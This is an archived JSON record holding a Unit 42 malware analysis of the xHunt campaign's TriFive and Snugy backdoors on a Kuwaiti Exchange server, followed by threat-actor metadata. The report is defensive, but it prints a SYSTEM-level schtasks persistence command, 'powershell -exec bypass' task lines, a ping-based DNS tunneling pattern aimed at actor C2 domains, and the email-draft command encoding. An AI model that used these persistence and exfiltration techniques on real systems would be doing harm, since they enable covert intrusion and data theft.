{
    "id": "887d32cd-05d5-4d01-9d59-aae0312005be",
    "created_at": "2023-01-12T15:00:59.898785Z",
    "updated_at": "2025-03-27T02:16:04.538608Z",
    "deleted_at": null,
    "sha1_hash": "6dbeeb8b93730b47167e1fcbcf1d6cfcf58da85b",
    "title": "2020-11-09 - xHunt Campaign- Newly Discovered Backdoors Using Deleted Email Drafts and DNS Tunneling for Command and Control",
    "authors": "",
    "file_creation_date": "2022-05-28T00:36:12Z",
    "file_modification_date": "2022-05-28T00:36:12Z",
    "file_size": 639449,
    "plain_text": "# xHunt Campaign: Newly Discovered Backdoors Using Deleted Email Drafts and DNS Tunneling for Command and Control\n\n**[unit42.paloaltonetworks.com/xhunt-campaign-backdoors/](https://unit42.paloaltonetworks.com/xhunt-campaign-backdoors/)**\n\nRobert Falcone November 9, 2020\n\nBy [Robert Falcone](https://unit42.paloaltonetworks.com/author/robertfalcone/)\n\nNovember 9, 2020 at 12:00 AM\n\n[Category: Unit 42](https://unit42.paloaltonetworks.com/category/unit-42/)\n\nTags: [backdoor,](https://unit42.paloaltonetworks.com/tag/backdoor/) [C2,](https://unit42.paloaltonetworks.com/tag/c2/) [CASHY200,](https://unit42.paloaltonetworks.com/tag/cashy200/) [dns tunneling,](https://unit42.paloaltonetworks.com/tag/dns-tunneling/) [Snugy,](https://unit42.paloaltonetworks.com/tag/snugy/) [TriFive,](https://unit42.paloaltonetworks.com/tag/trifive/) [xHunt](https://unit42.paloaltonetworks.com/tag/xhunt/)\n\nThis post is also available in: 日本語 [(Japanese)](https://unit42.paloaltonetworks.jp/xhunt-campaign-backdoors/)\n\n## Executive Summary\n\nThe xHunt campaign has been active since at least July 2018 and we have seen this group\n[target Kuwait government and](https://unit42.paloaltonetworks.com/more-xhunt-new-powershell-backdoor-blocked-through-dns-tunnel-detection/) [shipping and transportation organizations. Recently, we](https://unit42.paloaltonetworks.com/xhunt-campaign-attacks-on-kuwait-shipping-and-transportation-organizations/)\nobserved evidence that the threat actors compromised a Microsoft Exchange Server at an\norganization in Kuwait. We do not have visibility into how the actors gained access to this\nExchange server. However, based on the creation timestamps of scheduled tasks associated\nwith the breach, we believe the threat actors had gained access to the Exchange server on\n\n\n-----\n\nor before Aug. 22, 2019. The activity we observed involved two backdoors – one of which we\n[call TriFive and a variant of CASHY200 that we call Snugy – as well as a web shell that we](https://unit42.paloaltonetworks.com/more-xhunt-new-powershell-backdoor-blocked-through-dns-tunnel-detection/)\ncall BumbleBee.\n\nThe TriFive and Snugy backdoors are PowerShell scripts that provide backdoor access to\nthe compromised Exchange server, using different command and control (C2) channels to\ncommunicate with the actors. The TriFive backdoor uses an email-based channel that uses\nExchange Web Services (EWS) to create drafts within the Deleted Items folder of a\ncompromised email account. The Snugy backdoor uses a DNS tunneling channel to run\ncommands on the compromised server. We will provide an overview of these two backdoors\nsince they differ from tools previously used in the campaign.\n\nWe will be providing an analysis of the activity associated with the BumbleBee web shell in\nan upcoming blog. That activity provides a glimpse into the threat actor's tactics, techniques\nand procedures when interacting with compromised servers.\n\nPalo Alto Networks customers are protected from the attacks outlined in this blog in a variety\nof ways. See the Conclusion for more details.\n\n## TriFive and Snugy Backdoors\n\nIn September 2020, we were notified that threat actors breached an organization in Kuwait.\nThe organization's Exchange server had suspicious commands being executed via the\nInternet Information Services (IIS) process w3wp.exe. Actors issued these commands via a\nweb shell we call BumbleBee that had been installed on the Exchange server, which we will\ndiscuss in detail in a future blog. We investigated how the actors installed the web shell on\nthe system, and we did not find any evidence of exploitation of the Exchange server within\nthe logs that we were able to collect. However, we did discover two scheduled tasks created\nby the threat actor well before the dates of the collected logs, both of which would run\nmalicious PowerShell scripts. We cannot confirm that the actors used either of these\nPowerShell scripts to install the web shell, but we believe the threat actors already had\naccess to the server prior to the logs.\n\nThe actors created two tasks on the Exchange server named ResolutionHosts and\nResolutionsHosts, both of which were created within the\nc:\\Windows\\System32\\Tasks\\Microsoft\\Windows\\WDI folder. This folder also stores a\nlegitimate ResolutionHost task by default on Windows systems, as seen in Figure 1. The\nlegitimate ResolutionHost task is associated with the Windows Diagnostic Infrastructure\n(WDI) Resolution host that is used to provide interactive troubleshooting for problems that\narise on the system. We believe that the actor chose these task names specifically to blend\nin and appear to be part of the legitimate WDI.\n\n\n-----\n\n_Figure 1. Legitimate ResolutionHost Task associated with the Windows Diagnostic_\n_Infrastructure Resolution host. The tasks running the backdoors appear to imitate this task._\n\nOn Aug. 28 and Oct. 22, 2019, the actors created the ResolutionHosts and ResolutionsHosts\ntasks to run two separate PowerShell-based backdoors. The actors used these two\nscheduled tasks as a persistence method, as they ran the two PowerShell scripts repeatedly,\nalbeit at different intervals. Table 1 shows the two tasks and their associated creation times,\nrun intervals and the command executed. The commands executed by the two tasks attempt\nto run splwow64.ps1 and OfficeIntegrator.ps1, which are backdoors that we call TriFive and a\nvariant of CASHY200 that we call Snugy, respectively. The scripts were stored in two\nseparate folders on the system, which is likely an attempt to avoid both backdoors being\ndiscovered and removed.\n\n\n**Task** **Created**\n**Time**\n\nResolutionHosts 2019-0828T20:01:34\n\n\n**Run**\n**Interval**\n\n30\nminutes\n\n\n**Command**\n\npowershell -exec bypass -file\nC:\\Users\\Public\\Libraries\\OfficeIntegrator.ps1\n\n\n-----\n\nResolutionsHosts 2019-1022T15:02:39\n\n\n5\nminutes\n\n\npowershell -exec bypass -file\nc:\\windows\\splwow64.ps1\n\n\n_Table 1. Scheduled tasks used to persistently run malicious PowerShell-based backdoors._\n\nThe table also shows that the two backdoors were executed at different intervals, with TriFive\nbackdoor running every five minutes and the Snugy backdoor running every 30 minutes. We\ncannot confirm the exact reason behind the difference in intervals, but it may have to do with\nthe stealthiness of the C2 channel associated with the backdoor. For instance, Snugy may\nhave a longer interval than TriFive as it uses DNS tunneling as a C2 channel, which is a\nmore well-known C2 channel with a higher likelihood of detection compared to the previously\nunknown email-based C2 channel used by TriFive.\n\nWe were not able to confirm how the actors created the ResolutionHosts and\nResolutionsHosts tasks. However, we are aware of the actors using batch scripts to create\nscheduled tasks named SystemDataProvider and CacheTask- when installing Snugy\nsamples on other systems. For instance, the following batch script creates and runs a\nscheduled task named SystemDataProvider to run the Snugy sample named xpsrchvw.ps1:\n\nschtasks /create /sc MINUTE /mo 5 /tn \"\\Microsoft\\Windows\\SideShow\\SystemDataProvider\"\n/tr \"powershell -exec bypass -file C:\\Windows\\Temp\\xpsrchvw.ps1\" /ru SYSTEM & schtasks\n/run /tn \"\\Microsoft\\Windows\\SideShow\\SystemDataProvider\"\n\n## TriFive Backdoor\n\nTriFive is a previously unseen PowerShell-based backdoor that the xHunt actors installed on\nthe compromised Exchange server, executing every five minutes via a scheduled task.\nTriFive provided backdoor access to the Exchange server by logging into a legitimate user's\ninbox and obtaining a PowerShell script from an email draft within the deleted emails folder.\nThe TriFive sample used a legitimate account name and credentials from the targeted\norganization. This suggests that the threat actor had stolen the account's credentials prior to\nthe installation of the TriFive backdoor.\n\nThe use of email drafts and a shared email account between the Trojan and actor to facilitate\nC2 communications is not a new technique for the actors associated with xHunt. In fact, this\nsame general technique was used by the email-based C2 in the Hisoka tool discussed in the\n[initial publication about the xHunt campaign in September 2019. While the Hisoka tool used](https://unit42.paloaltonetworks.com/xhunt-campaign-attacks-on-kuwait-shipping-and-transportation-organizations/)\nemail drafts to send and receive data, these drafts remained in the Drafts folder, whereas the\nTriFive backdoor specifically saves its email drafts to the Deleted Items folder instead.\n\nTo issue commands to the backdoor, the actor would log into the same legitimate email\naccount and create an email draft with a subject of 555, including the command in encrypted\nand base64 encoded format. Figure 2 shows an example command email with a subject of\n\n\n-----\n\n555 and a message body of woFyeWt3cw==, which decodes and decrypts to whoami. The\nscript would execute this via PowerShell.\n\n_Figure 2. Email draft in Deleted Items folder issuing command to TriFive backdoor._\n\nTo run the commands supplied by the actor, the PowerShell script logs into a legitimate email\naccount on the Exchange server and checks the Deleted Items folder for emails with a\nsubject of 555. The script opens the email draft, base64 decodes the contents in the\nmessage body of the email and decrypts the decoded contents by subtracting 10 from each\ncharacter. The script then runs the resulting cleartext using PowerShell's built-in InvokeExpression (iex) cmdlet. After executing the provided PowerShell code, the script will encrypt\nthe results by adding 10 to each character and base64 encoding the ciphertext. TriFive will\nthen send the command results to the actor by setting the encoded ciphertext as the\nmessage body of an email draft that it will save in the Deleted Items folder with the subject of\n555 s. Figure 3 shows an example email draft in the Deleted Items folder created by the\nTriFive script to transmit the results of the command issued, which has a subject of 555 s\nand a message body of\nbQB5AHgAfgB5AH0AeQBmAGsAbgB3AHMAeABzAH0AfgB8AGsAfgB5AHwA, which\ndecodes and decrypts to contoso\\administrator.\n\n\n-----\n\n_Figure 3. Email draft in Deleted Items folder created by TriFive backdoor to send results to_\n_C2._\n\nThe TriFive PowerShell script does not have any loops to continually run on a system.\nInstead, TriFive relies on the previously mentioned ResolutionsHosts scheduled task for\npersistence.\n\n## Snugy Backdoor\n\nThe OfficeIntegrator.ps1 file seen in the ResolutionHosts task is a PowerShell-based\nbackdoor we call Snugy, which allows an actor to obtain the system's hostname and to run\ncommands. Snugy is a variant of the CASHY200 backdoor used by actors in previous\nattacks in the xHunt campaign. In July 2019, Trend Micro created a detection signature for\n[this backdoor called Backdoor.PS1.NETERO.A, which suggests that this particular variant of](https://www.trendmicro.com/vinfo/us/threat-encyclopedia/malware/backdoor.ps1.netero.a)\nCASHY200 has been around for over a year. We are calling this variant of the backdoor\nSnugy, as Netero is already a name of a variant of the Hisoka tool used by the xHunt actors.\n\nWe observed the following code overlaps between this Snugy tool and CASHY200:\n\n1. Function used to convert strings to hexadecimal representation.\n2. Function used to generate a string of random upper and lowercase characters.\n3. Regular expression to extract resolved IP address from either the ping or nslookup\n\ncommand, depending on the sample.\n4. Command handler uses the first octet of IP address to determine the command to run.\n5. Command handler has the same two commands available: get hostname and run\n\ncommand.\n\nMuch like CASHY200, Snugy uses DNS tunneling to communicate with its C2 server,\nspecifically by issuing DNS A record lookups to resolve custom crafted subdomains of actorcontrolled C2 domains. However, the structure of the custom crafted domains differs\ndramatically from previous CASHY200 samples due to the following:\n\n1. Variable values for important fields in the subdomain.\n2. Randomly chosen order of the fields in the data section.\n3. Randomly chosen C2 domains for each outbound query.\n4. Can only transmit one byte of data per query instead of 11.\n\nThe differences in the subdomains and amount of data that each query can transmit is the\nmain reason we gave this particular sample its own variant name. The Snugy sample was\nconfigured to choose one of the following domains at random as its C2 domain:\n\nhotsoft[.]icu\n\nuplearn[.]top\n\n\n-----\n\nlidarcc[.]icu\n\ndeman1[.]icu\n\nLike early variants of CASHY200, the Snugy variant uses the following command to ping a\ncustom crafted domain, which ultimately attempts to resolve the domain before sending the\nICMP requests to the resolving IP address:\n\ncmd /c ping -n 1 <custom crafted sub-domain>.<C2 domain>\n\nSnugy will extract the IP address that the ping application resolved using the following\nregular expression to gather the IP address from the ping results:\n\n\\b(?:(?:25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\\.){3}(?:25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\\b\n\nThis regular expression is publicly available on many sites as a way to extract or validate IP\naddresses. However, we saw this same regular expression in the CASHY200 tool used in\nprevious xHunt attacks. Snugy also has the same command set available as CASHY200 and\nuses the first octet to determine the command the actor wishes to run. Table 2 shows the two\nnumbers that will either send the hostname of the system to the C2 or run a command. The\nfirst octets of 86 and 102 differ from CASHY200's 48 and 92, but both backdoors use the\nsecond octet to determine how many DNS queries the backdoor needs to issue to download\nthe command from the C2.\n\n**IP address** **Description**\n\n86.x.x.x Runs hostname command and sends results to C2\n\n102.<# of queries>.x.x Run command via cmd /c and send results to C2\n\n_Table 2. Snugy backdoor command handler._\n\nThe subdomains created by Snugy include a communication type field, a field specifying the\norder of elements in the data section, and lastly the data section, as seen in the following C2\ndomain structure:\n\n<character for communication type><character for order of fields in data section><data\nsection>.<C2 domain>\n\nAs previously mentioned, the structure of the subdomain differs dramatically from previous\nvariants. Not only does it introduce multiple possible values for each communication type,\nbut it also includes a random order of fields in the data section of the subdomain as well. The\nfirst character in the subdomain generated by Snugy is the communication type, which tells\nthe C2 server the purpose of the inbound DNS query. Table 3 shows the possible characters\nfor each communication type that Snugy will choose at random when constructing the\nsubdomain, as well as the purpose of each type.\n\n\n-----\n\n**Comm Type** **Description**\n\n'q','b','e','d' or 'm' Initial Beacon\n\n'z','j','r','p' or 'x' Sending the hostname as data to the C2 server\n\n's','n','u','g' or 'y' Requesting a chunk of data from C2 server\n\n'c','f','v','h' or 'k' Sending the results of command execution as data to the C2 server\n\n'i','t','o','l' or 'w' Notification of the end of the data transmission\n\n_Table 3. Communication types and their purpose in Snugy's DNS tunneling protocol._\n\nThe second character in the subdomain generated by Snugy tells the C2 server the order of\nthe fields in the subsequent data section of the subdomain. The data section of the\nsubdomain contains the following three fields and their corresponding 0, 1 or 2 index used by\nSnugy to specify the order of the fields:\n\n0. 4 hexadecimal characters representing a 2-byte campaign code\n\n1. 2 random characters\n\n2. 2 hexadecimal characters representing one byte of data, followed by a sequence number\nbetween 1 and 9\n\nSnugy uses the 0, 1 and 2 index to order the fields in the data section and includes the order\ncharacter so the C2 understands how to parse inbound queries. Table 4 shows the order of\ndata fields and the corresponding character used to represent the order. It should be noted\nthat the data section is blank in the initial beacon communication type.\n\n\n**Index**\n**Order**\n\n\n**Character** **Structure of data field**\n\n\n012 t <campaign code><random characters><data and sequence\nnumber>\n\n021 m <campaign code><data and sequence number><random\ncharacters>\n\n102 d <random characters><campaign code><data and sequence\nnumber>\n\n120 h <random characters><data and sequence number><campaign\ncode>\n\n201 p <data and sequence number><campaign code><random\ncharacters>\n\n\n-----\n\n210 z <data and sequence number><random characters><campaign\ncode>\n\n_Table 4. Order of data fields and the corresponding character used in Snugy's DNS tunneling_\n_protocol._\n\nThe Snugy DNS tunneling protocol can only send one byte of data per query, making it quite\ninefficient at exfiltrating data, but the use of DNS A record queries suggests that the DNS\ntunneling protocol can receive four bytes of data per DNS query. For instance, if the C2\nserver resolves the beacon query to an IP address that has “86” as its first octet, Snugy will\nissue the 12 queries to transmit the host name “WIN-DESKTOP” to the C2 server. Table 5\nshows these 12 queries with each subdomain parsed as the C2 would upon receipt of the\nquery. This table highlights the inefficiency of this DNS tunneling protocol for data exfiltration.\n\n**Domain** **Parsed domain – Comm Type,Order,Data Ordered**\n\njp5717266vd.lidarcc.icu j (hostname) p (201) 57 ('W' data) 1 (seq) 7266 ('rf') vd (rand)\n\njhxv4927266.hotsoft.icu j (hostname) h (120) xv (rand) 49 ('I' data) 2 (seq) 7266 ('rf')\n\njp4e37266iB.hotsoft.icu j (hostname) p (201) 4e ('N' data) 3 (seq) 7266 ('rf') iB (rand)\n\njz2d4gs7266.deman1.icu j (hostname) z (210) 2d ('-' data) 4 (seq) gs (rand) 7266 ('rf')\n\njp4457266xr.hotsoft.icu j (hostname) p (201) 44 ('D' data) 5 (seq) 7266 ('rf') xr (rand)\n\njm7266456Va.hotsoft.icu j (hostname) m (021) 7266 ('rf') 45 ('E' data) 6 (seq) Va (rand)\n\njhNK5377266.uplearn.top j (hostname) h (120) NK (rand) 53 ('S' data) 7 (seq) 7266 ('rf')\n\njt7266CF4b8.lidarcc.icu j (hostname) t (012) 7266 ('rf') CF (rand) 4b ('K' data) 8 (seq)\n\njp5497266qV.uplearn.top j (hostname) p (201) 54 ('T' data) 9 (seq) 7266 ('rf') qV (rand)\n\njt7266iW4f1.lidarcc.icu j (hostname) t (012) 7266 ('rf') iW (rand) 4f ('O' data) 1 (seq)\n\njm7266502HA.lidarcc.icu j (hostname) m (021) 7266 ('rf') 50 ('P' data) 2 (seq) HA (rand)\n\not7266Ng502.hotsoft.icu o (done) t (012) 7266 ('rf') Ng (rand) 50 ('P' data) 2 (seq)\n\n_Table 5. Example queries of Snugy sending the hostname over DNS tunneling protocol._\n\nWe did observe the threat actors using the Snugy tool to run commands and exfiltrate the\nresults, as we were able to obtain the domains queried via ping requests sent from the\ncompromised server. Based on the exfiltrated data from within the subdomains, we were\nable to determine the actors ran ipconfig /all and dir. Unfortunately, we only had a subset of\nthe requests so the data exfiltrated was truncated, which also suggests that the actors likely\nran other commands that we did not observe.\n\n\n-----\n\nWe found a second Snugy sample on another server at the same Kuwaiti organization with a\nname of SyncRes.ps1 and a SHA256 hash of\na4a0ec94dd681c030d66e879ff475ca76668acc46545bbaff49b20e17683f99c. The actor\ninstalled this Snugy sample by saving this PowerShell script to C:\\Windows\\System32\\bg-BG\nand by creating a scheduled task named ResolutionHosts within the\nc:\\Windows\\System32\\Tasks\\Microsoft\\Windows\\RAC folder to run the PowerShell script\nevery 20 minutes. This particular Snugy sample only uses one root domain for C2,\nspecifically sharepoint-web[.]com, and uses a different structure for its custom crafted\nsubdomains for its DNS tunnel:\n\n<character for communication type><two random digits>46<3-bytes hexlified data section>.\n<C2 domain>\n\nThis Snugy sample uses a single character from a hardcoded character set at the beginning\nof the subdomain to signify the communication type. The character sets used for the\ncommunication type are the same as the previously discussed OfficeIntegrator.ps1 variant,\nbut with the exception of snugy, the character sets signify different communication types, as\nseen in Table 6. Table 6 also shows that this sample only has three communication types.\nThe sample does not include the hostname command. Rather, it can only run commands if\nthe C2 answers the beacon query with an IP address with 199 as the first octet.\n\n**Comm Type** **Description**\n\n'i','t','o','l' or 'w' Initial Beacon\n\n's','n','u','g' or 'y' Requesting a chunk of data from C2 server\n\n'q','b','e','d' or 'm' Sending the results of command execution as data to the C2 server\n\n_Table 6. Communication types and their purpose in the DNS tunneling protocol found in the_\n_second Snugy sample._\n\n## Infrastructure Links to xHunt\n\nThe infrastructure associated with the activity outlined in this blog involves the five domains\nthat Snugy communicated with as its C2 using DNS tunneling, specifically hotsoft[.]icu,\nuplearn[.]top, lidarcc[.]icu, deman1[.]icu and sharepoint-web[.]com. While there was not a lot\nof overlap with other infrastructure, the domain ns1.alforatsystem[.]com resolved to the same\nIP address as several of the ns1 and ns2 subdomains on the Snugy C2 domains in May\n2019, as seen in Table 7.\n\n**Domain** **Passive DNS** **First seen**\n\nns1.hotsoft[.]icu 198.98.48[.]181 05/06/2019 10:48:37 AM\n\n\n-----\n\nns2.hotsoft[.]icu 198.98.48[.]181 05/06/2019 10:48:37 AM\n\nns1.uplearn[.]top 198.98.48[.]181 05/11/2019 11:42:40 AM\n\nns2.uplearn[.]top 198.98.48[.]181 05/11/2019 11:42:40 AM\n\nns1.lidarcc[.]icu 198.98.48[.]181 05/08/2019 12:53:29 PM\n\nns2.lidarcc[.]icu 198.98.48[.]181 05/08/2019 12:53:29 PM\n\nns1.deman1[.]icu 198.98.48[.]181 05/08/2019 10:30:24 AM\n\nns2.deman1[.]icu 198.98.48[.]181 05/08/2019 10:30:24 AM\n\nns1.alforatsystem[.]com 198.98.48[.]181 05/05/2019 8:41:38 AM\n\nns2.alforatsystem[.]com 198.98.48[.]181 05/05/2019 8:41:38 AM\n\n_Table 7. Infrastructure overlap between Snugy C2 domains and a domain previously used in_\n_xHunt._\n\nActors used the alforatsystem[.]com domain to host ZIP archives that they used to deliver\n[LNK shortcut files to install backdoors in previous attacks during the xHunt campaign. The](https://unit42.paloaltonetworks.com/xhunt-campaign-attacks-on-kuwait-shipping-and-transportation-organizations/)\nalforatsystem[.]com domain also has significant infrastructure overlap with other domains\n[associated with xHunt as discussed in our previous publications, such as](https://unit42.paloaltonetworks.com/xhunt-campaign-attacks-on-kuwait-shipping-and-transportation-organizations/)\nfirewallsupports[.]com and pasta58[.]com, among others.\n\n## Conclusion\n\nThe xHunt campaign continues as threat actors attack organizations in Kuwait. The group\nshows an ability to adjust their tools with slightly new features and communication channels\nto avoid detection. Both of the backdoors installed on the compromised Exchange server of a\nKuwait government organization used covert channels for C2 communications, specifically\nDNS tunneling and an email-based channel using drafts in the Deleted Items folder of a\ncompromised email account. Only one variant of the Hisoka tool used in the xHunt campaign\nhas used email drafts and a compromised email account for C2 communications, so it\nappears that this group is beginning to use an email-based communication channel when\nthey already have access to a compromised Exchange server at an organization.\n\nPalo Alto Networks customers are protected from the attacks outlined in this blog in the\nfollowing ways:\n\n[All known TriFive and Snugy backdoors have malicious verdicts in WildFire.](https://www.paloaltonetworks.com/products/secure-the-network/wildfire)\n[AutoFocus customers can track the TriFive and Snugy backdoors with the tags TriFive](https://www.paloaltonetworks.com/cortex/autofocus)\n[and Snugy.](https://autofocus.paloaltonetworks.com/#/tag/Unit42.Snugy)\n[Cortex XDR blocks both TriFive and Snugy payloads.](https://www.paloaltonetworks.com/cortex/cortex-xdr)\n\n\n-----\n\n[Snugy C2 domains have been categorized as Command and Control in URL Filtering](https://www.paloaltonetworks.com/products/threat-detection-and-prevention/web-security)\n[and DNS Security.](https://www.paloaltonetworks.com/products/threat-detection-and-prevention/dns-security)\n[Threat Prevention signature “TriFive Backdoor Command and Control Traffic Detection”](https://www.paloaltonetworks.com/products/secure-the-network/subscriptions/threat-prevention)\ndetects the TriFive command and control channel.\n\n**Additional Resources**\n\n[xHunt Campaign: New Watering Hole Identified for Credential Harvesting](https://unit42.paloaltonetworks.com/xhunt-campaign-new-watering-hole-identified-for-credential-harvesting/)\n\n[xHunt Campaign: xHunt Actor’s Cheat Sheet](https://unit42.paloaltonetworks.com/xhunt-actors-cheat-sheet/)\n\n[xHunt Campaign: New PowerShell Backdoor Blocked Through DNS Tunnel Detection](https://unit42.paloaltonetworks.com/more-xhunt-new-powershell-backdoor-blocked-through-dns-tunnel-detection/)\n\n[xHunt Campaign: Attacks on Kuwait Shipping and Transportation Organizations](https://unit42.paloaltonetworks.com/xhunt-campaign-attacks-on-kuwait-shipping-and-transportation-organizations/)\n\n## Indicators of Compromise\n\n**TriFive Samples**\n\n407e5fe4f6977dd27bc0050b2ee8f04b398e9bd28edd9d4604b782a945f8120f\n\n**Snugy Samples**\n\nc18985a949cada3b41919c2da274e0ffa6e2c8c9fb45bade55c1e3b6ee9e1393\n\n6c13084f213416089beec7d49f0ef40fea3d28207047385dda4599517b56e127\n\nefaa5a87afbb18fc63dbf4527ca34b6d376f14414aa1e7eb962485c45bf38372\n\na4a0ec94dd681c030d66e879ff475ca76668acc46545bbaff49b20e17683f99c\n\n**Snugy C2 Domains**\n\ndeman1[.]icu\n\nhotsoft[.]icu\n\nuplearn[.]top\n\nlidarcc[.]icu\n\nsharepoint-web[.]com\n\n**Scheduled Task Names**\n\nResolutionHosts\n\nResolutionsHosts\n\n\n-----\n\nSystemDataProvider\n\nCacheTask\n**Get updates from**\n**Palo Alto**\n**Networks!**\n\nSign up to receive the latest news, cyber threat intelligence and research from us\n\n[By submitting this form, you agree to our Terms of Use and acknowledge our Privacy](https://www.paloaltonetworks.com/legal-notices/terms-of-use)\nStatement.\n\n\n-----",
    "language": "EN",
    "sources": [
        {
            "id": "05d7b179-7656-44d8-a74c-9ab34d3df3a2",
            "created_at": "2023-01-12T14:38:44.599904Z",
            "updated_at": "2023-01-12T14:38:44.599904Z",
            "deleted_at": null,
            "name": "VXUG",
            "url": "https://www.vx-underground.org",
            "description": "vx-underground Papers",
            "reports": null
        }
    ],
    "references": [
        "https://papers.vx-underground.org/papers/Malware Defense/Malware Analysis 2020/2020-11-09 - xHunt Campaign- Newly Discovered Backdoors Using Deleted Email Drafts and DNS Tunneling for Command and Control.pdf"
    ],
    "report_names": [
        "2020-11-09 - xHunt Campaign- Newly Discovered Backdoors Using Deleted Email Drafts and DNS Tunneling for Command and Control.pdf"
    ],
    "threat_actors": [
        {
            "id": "21e998eb-31c8-4281-be1d-1a5133330eb9",
            "created_at": "2023-01-06T13:46:39.14468Z",
            "updated_at": "2025-03-27T02:00:03.007083Z",
            "deleted_at": null,
            "main_name": "COBALT KATANA",
            "aliases": [
                "Hive0081 (IBM)",
                "SectorD01 (NHSC)",
                "xHunt campaign (Palo Alto)",
                "Hunter Serpens"
            ],
            "source_name": "MISPGALAXY:COBALT KATANA",
            "tools": [],
            "source_id": "MISPGALAXY",
            "reports": null
        },
        {
            "id": "dc74686b-db66-426a-95bb-d4ce8ef7e967",
            "created_at": "2024-05-01T02:03:08.033074Z",
            "updated_at": "2025-03-27T02:05:17.31649Z",
            "deleted_at": null,
            "main_name": "COBALT KATANA",
            "aliases": [
                "SectorD01 ",
                "xHunt campaign ",
                "Hive0081 "
            ],
            "source_name": "Secureworks:COBALT KATANA",
            "tools": [
                " Diezen",
                " Eye",
                " Gon",
                " Hisoka",
                " Hisoka Netero",
                " HyphenShell",
                " Killua",
                " Sakabota",
                " Sakabota Framework",
                "CASHY200"
            ],
            "source_id": "Secureworks",
            "reports": null
        },
        {
            "id": "20bc5b83-9ea0-4e60-a23e-19bf203dc9fb",
            "created_at": "2022-10-25T16:07:24.432777Z",
            "updated_at": "2025-03-27T02:02:10.220082Z",
            "deleted_at": null,
            "main_name": "xHunt",
            "aliases": [
                "Cobalt Katana",
                "Hive0081",
                "Hunter Serpens",
                "SectorD01"
            ],
            "source_name": "ETDA:xHunt",
            "tools": [
                "CASHY200",
                "COLDTRAIN",
                "Gon",
                "Hisoka",
                "Killua",
                "Netero",
                "SHELLSTING",
                "Sakabota",
                "Snugy",
                "TriFive"
            ],
            "source_id": "ETDA",
            "reports": null
        }
    ],
    "ts_created_at": 1673535659,
    "ts_updated_at": 1743041764,
    "ts_creation_date": 1653698172,
    "ts_modification_date": 1653698172,
    "files": {
        "pdf": "https://archive.orkl.eu/6dbeeb8b93730b47167e1fcbcf1d6cfcf58da85b.pdf",
        "text": "https://archive.orkl.eu/6dbeeb8b93730b47167e1fcbcf1d6cfcf58da85b.txt",
        "img": "https://archive.orkl.eu/6dbeeb8b93730b47167e1fcbcf1d6cfcf58da85b.jpg"
    }
}